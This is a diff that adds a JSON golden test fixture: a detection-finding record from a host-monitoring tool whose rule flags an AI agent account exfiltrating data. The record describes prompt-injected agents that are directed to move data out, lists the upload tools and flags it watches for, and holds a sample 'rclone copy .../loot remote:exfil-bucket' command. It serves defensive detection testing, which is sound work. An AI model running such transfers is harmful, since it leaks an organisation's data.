@@ -1,0 +1,133 @@
+{
+  "activity_id": 1,
+  "activity_name": "Create",
+  "category_uid": 2,
+  "category_name": "Findings",
+  "class_uid": 2004,
+  "class_name": "Detection Finding",
+  "type_uid": 200401,
+  "type_name": "Detection Finding: Create",
+  "time": 1793448000000,
+  "timezone_offset": 0,
+  "severity_id": 4,
+  "severity": "High",
+  "status_id": 1,
+  "status": "New",
+  "message": "rule \"agent_ai_enabled_exfil\" matched",
+  "metadata": {
+    "version": "1.3.0",
+    "profiles": [
+      "host"
+    ],
+    "product": {
+      "name": "banken",
+      "vendor_name": "conor-sometimes",
+      "version": "test",
+      "url_string": "https://github.com/conor-sometimes/banken"
+    },
+    "uid": "8ffd33f325f26298cf06e53be0c615ab",
+    "log_provider": "laurel"
+  },
+  "finding_info": {
+    "uid": "8ffd33f325f26298cf06e53be0c615ab",
+    "title": "AI agent account exfiltrating data to external storage",
+    "desc": "An AI agent account ran a bulk data-transfer to external storage - rclone/aws s3/gsutil/az blob/ mc/b2 to a remote bucket, or curl/wget uploading a file (--upload-file, -T, --post-file, -F, --data-binary @). This is the host-observable footprint of MITRE T1700 AI-Enabled Exfiltration (new in ATT&CK v20): an attacker who has prompt-injected or hijacked an agent directs it to move an organisation's data out using the agent's own sanctioned tools. banken cannot see the prompt that drove it (the LLM transcript is invisible by design), but it sees the agent executing a transfer - which is the realised effect and what the T1700 analytics (AN2079/AN2080) key on: transfer-capable execution followed by an outbound connection from the agent's process lineage.\nThis is an \"agentic AI detection\" rule, scoped by account so the behaviour is clean signal from the agent even though it is noise on a human login. See rules/agent/README.md. agent_exfil_to_code_host owns the git/gist/release/npm-publish channel; this owns object-storage and generic file-upload.",
+    "analytic": {
+      "type_id": 1,
+      "type": "Rule",
+      "name": "agent_ai_enabled_exfil",
+      "uid": "3b2ae8d0-9180-4bc5-a6ef-2a58735007dd"
+    },
+    "attacks": [
+      {
+        "tactic": {
+          "uid": "TA0010",
+          "name": "Exfiltration"
+        },
+        "technique": {
+          "uid": "T1700"
+        }
+      },
+      {
+        "tactic": {
+          "uid": "TA0010",
+          "name": "Exfiltration"
+        },
+        "technique": {
+          "uid": "T1567"
+        },
+        "sub_technique": {
+          "uid": "T1567.002"
+        }
+      }
+    ],
+    "data_sources": [
+      "laurel"
+    ]
+  },
+  "evidences": [
+    {
+      "process": {
+        "pid": 12410,
+        "name": "rclone",
+        "cmd_line": "rclone copy /home/claude/loot remote:exfil-bucket",
+        "file": {
+          "name": "rclone",
+          "path": "/usr/bin/rclone",
+          "type_id": 1,
+          "type": "Regular File"
+        },
+        "user": {
+          "name": "claude"
+        },
+        "parent_process": {
+          "pid": 12400
+        }
+      }
+    }
+  ],
+  "device": {
+    "type_id": 0,
+    "type": "Unknown",
+    "hostname": "golden-host"
+  },
+  "observables": [
+    {
+      "name": "evidences.process.cmd_line",
+      "type_id": 13,
+      "type": "Command Line",
+      "value": "rclone copy /home/claude/loot remote:exfil-bucket"
+    },
+    {
+      "name": "evidences.process.name",
+      "type_id": 9,
+      "type": "Process Name",
+      "value": "rclone"
+    },
+    {
+      "name": "evidences.process.file.path",
+      "type_id": 7,
+      "type": "File Name",
+      "value": "/usr/bin/rclone"
+    },
+    {
+      "name": "evidences.process.user.name",
+      "type_id": 4,
+      "type": "User Name",
+      "value": "claude"
+    },
+    {
+      "name": "device.hostname",
+      "type_id": 1,
+      "type": "Hostname",
+      "value": "golden-host"
+    }
+  ],
+  "raw_data": "{\"time\":\"0001-01-01T00:00:00Z\",\"source\":\"laurel\",\"image\":\"/usr/bin/rclone\",\"commandLine\":\"rclone copy /home/claude/loot remote:exfil-bucket\",\"parentImage\":\"\",\"targetFilename\":\"\",\"user\":\"claude\",\"currentDirectory\":\"/home/claude\",\"pid\":12410,\"ppid\":12400}",
+  "unmapped": {
+    "current_directory": "/home/claude",
+    "kind": "sigma",
+    "rule": "agent_ai_enabled_exfil",
+    "source": "laurel"
+  }
+}
